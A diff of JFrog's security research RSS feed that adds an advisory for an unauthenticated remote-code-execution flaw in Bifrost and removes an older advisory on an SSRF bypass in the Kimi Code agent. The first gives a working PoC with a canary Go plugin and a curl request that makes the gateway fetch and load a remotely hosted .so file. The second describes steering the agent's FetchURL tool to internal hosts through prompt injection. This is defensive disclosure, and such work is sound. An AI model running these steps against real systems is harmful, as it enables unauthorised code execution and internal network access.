@@ -4,11 +4,126 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Sun, 06 Sep 2026 00:42:57 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 06 Sep 2026 12:55:25 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[Bifrost is vulnerable to Unauthenticated Remote Code Execution via a Custom Plugin HTTP Path on Dynamically Linked Builds]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-a-custom-plugin-http-path-on-dynamically-linked-builds-cve-2026-86242-jfsa-2026-001684572/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-a-custom-plugin-http-path-on-dynamically-linked-builds-cve-2026-86242-jfsa-2026-001684572/</guid>
+            <pubDate>Sun, 06 Sep 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-86242, HIGH, Bifrost is vulnerable to Unauthenticated Remote Code Execution via a Custom Plugin HTTP Path on Dynamically Linked Builds]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Bifrost is vulnerable to Unauthenticated Remote Code Execution via a Custom Plugin HTTP Path on Dynamically Linked Builds
+
+
+## Component
+
+Bifrost (github.com/maximhq/bifrost/transports)
+
+## Affected versions
+
+< 2.0.0
+
+## Description
+
+Bifrost HTTP transport before 2.0.0 accepts an enabled custom plugin whose path is an HTTP URL through unauthenticated POST /api/plugins when management authentication is disabled (the default, governance.auth_config.is_enabled=false). The shared-object loader treats an http-prefixed path as a download URL, writes the body to a temporary .so, and passes it to Go's plugin.Open. After a successful open, optional Init runs immediately with the supplied config as the Bifrost process user.
+
+On documented dynamically linked builds (DYNAMIC=1), which the vendor requires for custom Go plugins, plugin.Open is expected to succeed. That is unauthenticated remote code execution in the gateway process. On the published statically linked Docker image, plugin.Open fails with Dynamic loading not supported, so that build class is only server-side request forgery. A loadable plugin must also match the host Go version, operating system, architecture, and linkage. The stock bifrost-http binary binds localhost:8080; the official Docker image binds 0.0.0.0 but is statically linked. The 1.6.x HTTP transport line through 1.6.11 does not contain the fix.
+
+## PoC
+
+<br>
+
+**Step 1 - Build a dynamically linked Bifrost**
+
+<br>
+
+From a Bifrost transports checkout before 2.0.0, build with plugin support and run it with management authentication left disabled (the default). The management API must be reachable on the host and port you use below (the binary default is localhost:8080):
+
+```
+make build DYNAMIC=1
+```
+
+<br>
+
+**Step 2 - Build a canary plugin**
+
+<br>
+
+Build a Go shared object with the same Go version and libc as that binary. A minimal Init that writes a marker is enough:
+
+```
+package main
+
+import "os"
+
+func Init(config any) error {
+    return os.WriteFile("/tmp/bifrost-plugin-rce", []byte("PROVEN\n"), 0644)
+}
+
+func GetName() string { return "evilplugin" }
+
+func Cleanup() error { return nil }
+```
+
+```
+go build -buildmode=plugin -o /tmp/evilplugin.so main.go
+```
+
+<br>
+
+**Step 3 - Host the shared object and register it**
+
+<br>
+
+Serve /tmp/evilplugin.so over HTTP on an address the Bifrost host can reach, then create an enabled plugin with that URL as path. No authentication header is required:
+
+```
+curl -sS -X POST "http://127.0.0.1:8080/api/plugins" \
+  -H "Content-Type: application/json" \
+  -d "{\"name\": \"evilplugin\", \"enabled\": true, \"path\": \"http://<host>:<port>/evilplugin.so\"}"
+```
+
+<br>
+
+**Step 4 - Confirm the code ran**
+
+<br>
+
+Expected output on a dynamically linked build:
+
+```
+cat /tmp/bifrost-plugin-rce
+```
+
+```
+PROVEN
+```
+
+<br>
+
+On a static or official image instead, expect the download to succeed and plugin.Open to fail with Dynamic loading not supported.
+
+## Vulnerability Mitigations
+
+Upgrade Bifrost HTTP transport to 2.0.0 or later. The fix (https://github.com/maximhq/bifrost/pull/5763) refuses create and update of a non-builtin plugin path when the request was let through because dashboard authentication is disabled or unconfigured, and hardens the plugin downloader against SSRF. The 1.6.x line through 1.6.11 does not include this change.
+
+If custom Go plugins are not required, run the statically linked binary or official Docker image so plugin.Open cannot succeed. Otherwise enable dashboard authentication and keep the management listener off untrusted networks.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-86242
+https://github.com/maximhq/bifrost/security/advisories/GHSA-2qp8-4xgm-fw6g
+https://github.com/maximhq/bifrost/pull/5763
+https://github.com/maximhq/bifrost/commit/e0057ff355f831c251eabe9d0e44f3a3748532c6
+https://github.com/maximhq/bifrost/releases/tag/transports/v2.0.0
+https://github.com/maximhq/bifrost
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[When "Critical" Loses Context: The Reality of Spring CVEs]]></title>
             <link>https://research.jfrog.com/post/when-critical-loses-context-spring-cves/</link>
@@ -1649,83 +1764,6 @@ To avoid being affected by this kind of vulnerability noise:
 # **Reported Findings**
 
 We have also formally reported these findings to GHSA, Redhat and NVD to assist in the remediation of these records.]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Kimi Code is vulnerable to a FetchURL SSRF Protection Bypass via DNS-resolving Hostnames and Redirects]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/kimi-code-is-vulnerable-to-a-fetchurl-ssrf-protection-bypass-via-dns-resolving-hostnames-and-redirects-cve-2026-17534/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/kimi-code-is-vulnerable-to-a-fetchurl-ssrf-protection-bypass-via-dns-resolving-hostnames-and-redirects-cve-2026-17534/</guid>
-            <pubDate>Mon, 27 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17534, MEDIUM, Kimi Code is vulnerable to a FetchURL SSRF Protection Bypass via DNS-resolving Hostnames and Redirects]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Kimi Code is vulnerable to a FetchURL SSRF Protection Bypass via DNS-resolving Hostnames and Redirects
-
-
-## Component
-
-@moonshot-ai/kimi-code (Kimi Code)
-
-## Affected versions
-
-< 0.27.0
-
-## Description
-
-Kimi Code implements FetchURL SSRF hardening as a static hostname and IP-literal denylist in assertSafeFetchTarget, without resolving DNS or re-validating hosts after HTTP redirects. An attacker who can influence a FetchURL call, for example via prompt injection, can supply a crafted public hostname that resolves to loopback or another internal address, or a public URL that redirects to such a target, and thereby reach internal network services that the denylist was intended to block. FetchURL is included in the default auto-approve tool set, so the call does not require interactive user confirmation in manual mode.
-
-## PoC
-
-<br>
-
-**Step 1 - Start a local HTTP listener**
-
-<br>
-
-```python3 -m http.server 1337 --bind 127.0.0.1```
-
-<br>
-
-**Step 2 - Confirm the literal denylist blocks localhost**
-
-<br>
-
-Ask the agent to use FetchURL on `http://localhost:1337` (or `http://127.0.0.1:1337`).
-
-<br>
-
-Expected result: the request is denied by assertSafeFetchTarget (for example, "Refusing to fetch private host").
-
-<br>
-
-**Step 3 - Bypass via a DNS-resolving hostname**
-
-<br>
-
-Ask the agent to use FetchURL on a public hostname whose DNS resolves to loopback, for example `http://localtest.me:1337`.
-
-<br>
-
-**Step 4 - Verify the request reaches the local listener**
-
-<br>
-
-Watch the simple HTTP server console. A GET request arrives from the Kimi Code process, demonstrating that DNS-resolving names are not validated against private address ranges.
-
-<br>
-
-The same class of bypass applies to public URLs that HTTP-redirect to loopback or internal targets, because redirects were followed without re-running the safety check on each hop.
-
-## Vulnerability Mitigations
-
-Upgrade to Kimi Code 0.27.0 or later. The fix resolves hostnames via DNS and rejects addresses in loopback, RFC1918, link-local, CGNAT, and ULA ranges; follows redirects manually with per-hop revalidation; and pins connections to the validated resolved addresses to reduce DNS-rebinding (TOCTOU) races.
-
-## References
-https://github.com/MoonshotAI/kimi-code/pull/1791
-https://github.com/MoonshotAI/kimi-code/commit/31449728b72df94e22bcb2de350a1e7624895e30
-https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%400.27.0
-
-]]></content:encoded>
         </item>
     </channel>
 </rss>
